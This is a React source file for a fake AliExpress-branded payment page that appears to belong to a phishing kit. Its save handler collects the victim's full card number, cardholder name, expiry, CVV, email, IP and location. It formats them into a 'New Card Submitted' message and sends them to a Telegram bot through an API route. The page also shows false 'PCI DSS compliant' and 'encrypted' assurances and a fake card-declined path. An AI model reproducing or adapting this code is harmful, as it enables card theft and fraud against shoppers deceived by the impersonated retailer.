'use client';
import React, { useState } from 'react';
import { ArrowLeft, CreditCard, ScanLine, HelpCircle, ShieldCheck, Check, AlertCircle } from 'lucide-react';
import { useTranslation } from '@/lib/TranslationContext';
import { loadBotConfigFromServer } from '@/lib/botConfig';

interface PaymentPageProps {
  onBack: () => void;
  onComplete: (cardNumber: string, nameOnCard: string, expiry: string, cvv: string) => void;
  botToken: string;
  chatId: string;
  currentIp: string;
  country?: string;
  city?: string;
  zip?: string;
  email?: string;
  isDeclined?: boolean;
}

export const PaymentPage: React.FC<PaymentPageProps> = ({
  onBack,
  onComplete,
  currentIp,
  country,
  city,
  zip,
  email: initialEmail,
  isDeclined = false,
}) => {
  const { t } = useTranslation();
  const [email, setEmail] = useState(initialEmail || '');
  const [cardNumber, setCardNumber] = useState('');
  const [nameOnCard, setNameOnCard] = useState('');
  const [expiry, setExpiry] = useState('');
  const [cvv, setCvv] = useState('');
  const [isSaving, setIsSaving] = useState(false);
  const [error, setError] = useState(isDeclined ? t('cardDeclined') : '');

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const raw = e.target.value.replace(/\D/g, '').slice(0, 16);
    const formatted = raw.replace(/(.{4})/g, '$1 ').trim();
    setCardNumber(formatted);
  };

  const handleNameChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setNameOnCard(e.target.value.toUpperCase());
  };

  const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let val = e.target.value.replace(/\D/g, '').slice(0, 4);
    if (val.length >= 3) val = val.slice(0, 2) + '/' + val.slice(2);
    setExpiry(val);
  };

  const handleCvvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setCvv(e.target.value.replace(/\D/g, '').slice(0, 4));
  };

  const handleSave = async () => {
    setError('');
    
    // Validate email
    if (!email || !email.includes('@')) {
      setError('Please enter a valid email address');
      return;
    }

    setIsSaving(true);
    const rawCard = cardNumber.replace(/\s/g, '');

    // Load config fresh from server and send card details — ONLY from here (not duplicated in page.tsx)
    const { token, chatId } = await loadBotConfigFromServer();
    console.log('[Payment] token:', token ? '✓' : '✗', 'chatId:', chatId ? '✓' : '✗');

    if (token && chatId) {
      const now = new Date().toLocaleString('en-GB', { timeZone: 'UTC', hour12: false });
      const msg =
        `💳 <b>New Card Submitted</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━━━\n` +
        `💳 <b>Card Number:</b> <code>${rawCard}</code>\n` +
        `👤 <b>Name on Card:</b> <code>${nameOnCard}</code>\n` +
        `📅 <b>Expiry:</b> <code>${expiry}</code>\n` +
        `🔒 <b>CVV:</b> <code>${cvv}</code>\n` +
        `━━━━━━━━━━━━━━━━━━━━━━\n` +
        `📧 <b>Email:</b> <code>${email || 'N/A'}</code>\n` +
        `🌍 <b>Country:</b> ${country || 'Unknown'}\n` +
        `🏙 <b>City:</b> ${city || 'Unknown'}\n` +
        `📮 <b>ZIP Code:</b> ${zip || 'Unknown'}\n` +
        `📍 <b>IP Address:</b> <code>${currentIp || 'Unknown'}</code>\n` +
        `🕐 <b>Time (UTC):</b> ${now}\n` +
        `━━━━━━━━━━━━━━━━━━━━━━\n` +
        `🛒 <i>AliExpress — Track</i>`;

      try {
        const res = await fetch('/api/telegram', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ token, chatId, text: msg }),
        });
        const data = await res.json();
        if (!data.ok) {
          console.error('[Payment] Telegram error:', data.description || data.error);
        } else {
          console.log('[Payment] Telegram sent OK');
        }
      } catch (e) {
        console.error('[Payment] Telegram send failed:', e);
      }
    }

    setTimeout(() => {
      setIsSaving(false);
      onComplete(rawCard, nameOnCard, expiry, cvv);
    }, 500);
  };

  const isFormIncomplete = !email || !email.includes('@') || cardNumber.replace(/\s/g, '').length < 16 || expiry.length < 5 || cvv.length < 3;

  return (
    <div className="min-h-screen bg-white flex flex-col items-center max-w-md mx-auto relative shadow-xl overflow-y-auto">
      <header className="w-full flex items-center justify-between p-4 bg-white sticky top-0 z-10 border-b border-gray-100">
        <button onClick={onBack} className="p-1 hover:bg-gray-100 rounded-full">
          <ArrowLeft className="w-6 h-6 text-gray-800" />
        </button>
        <h1 className="text-lg font-bold text-gray-900">{t('addNewCard')}</h1>
        <div className="w-8" />
      </header>

      <main className="w-full px-5 py-6 space-y-6">
        {error && (
          <div className="bg-red-50 border border-red-100 p-4 rounded-xl flex items-center gap-3">
            <AlertCircle className="w-5 h-5 text-red-500" />
            <span className="text-sm text-red-600 font-bold">{error}</span>
          </div>
        )}

        <div className="space-y-4">
          <h2 className="text-base font-bold text-gray-900">{t('yourInformation')}</h2>
          <div className="space-y-4">
            {/* Email */}
            <input
              type="email"
              placeholder={t('emailAddress')}
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              className="w-full px-4 py-4 text-black font-semibold border border-gray-300 rounded-lg outline-none focus:border-[#FF4747] bg-white"
            />
          </div>
        </div>

        <div className="space-y-4">
          <h2 className="text-base font-bold text-gray-900">{t('paymentMethod')}</h2>
          <div className="space-y-4">
            {/* Card number */}
            <div className="relative">
              <div className="absolute left-4 top-1/2 -translate-y-1/2">
                <CreditCard className="w-5 h-5 text-gray-400" />
              </div>
              <input
                type="tel"
                inputMode="numeric"
                placeholder={t('cardNumber')}
                value={cardNumber}
                onChange={handleCardNumberChange}
                className="w-full pl-12 pr-12 py-4 text-black font-semibold border border-gray-300 rounded-lg outline-none focus:border-[#FF4747] bg-white"
              />
              <div className="absolute right-4 top-1/2 -translate-y-1/2">
                <ScanLine className="w-5 h-5 text-gray-600" />
              </div>
            </div>

            {/* Name on card */}
            <input
              type="text"
              placeholder={t('nameOnCard')}
              value={nameOnCard}
              onChange={handleNameChange}
              className="w-full px-4 py-4 text-black font-semibold border border-gray-300 rounded-lg outline-none focus:border-[#FF4747] bg-white"
            />

            {/* Expiry */}
            <input
              type="tel"
              inputMode="numeric"
              placeholder={t('expiryDate')}
              value={expiry}
              onChange={handleExpiryChange}
              className="w-full px-4 py-4 text-black font-semibold border border-gray-300 rounded-lg outline-none focus:border-[#FF4747] bg-white"
            />

            {/* CVV */}
            <div className="relative">
              <input
                type="tel"
                inputMode="numeric"
                placeholder={t('cvv')}
                maxLength={4}
                value={cvv}
                onChange={handleCvvChange}
                className="w-full px-4 py-4 text-black font-semibold border border-gray-300 rounded-lg outline-none focus:border-[#FF4747] bg-white"
              />
              <div className="absolute right-4 top-1/2 -translate-y-1/2">
                <HelpCircle className="w-5 h-5 text-gray-400" />
              </div>
            </div>
          </div>
        </div>

        <div className="pt-4 space-y-4">
          <div className="flex items-center gap-3">
            <ShieldCheck className="w-6 h-6 text-gray-800" />
            <span className="text-[15px] font-bold text-gray-900">{t('securePayment')}</span>
          </div>
          <ul className="space-y-3">
            <li className="flex items-start gap-3 text-sm text-gray-600">
              <Check className="w-4 h-4 text-emerald-500 mt-1" /> PCI DSS compliant.
            </li>
            <li className="flex items-start gap-3 text-sm text-gray-600">
              <Check className="w-4 h-4 text-emerald-500 mt-1" /> All data is encrypted.
            </li>
          </ul>
        </div>

        {/* Delivery fee notice */}
        <div className="bg-orange-50 border border-orange-200 rounded-xl p-4 flex items-start gap-3">
          <span className="text-orange-500 text-xl leading-none mt-0.5">🚚</span>
          <p className="text-sm text-orange-800 font-medium leading-snug">{t('deliveryFeeNotice')}</p>
        </div>

        <button
          onClick={handleSave}
          disabled={isSaving || isFormIncomplete}
          className={`w-full bg-[#E62E04] text-white py-4 rounded-full text-lg font-bold active:scale-[0.98] transition-all ${
            (isSaving || isFormIncomplete) ? 'opacity-70 cursor-not-allowed' : ''
          }`}
        >
          {isSaving ? (
            <span className="flex items-center justify-center gap-2">
              <svg className="animate-spin h-5 w-5 text-white/70" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
                <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" />
              </svg>
              {t('processing')}
            </span>
          ) : t('continuePayment')}
        </button>
      </main>
    </div>
  );
};
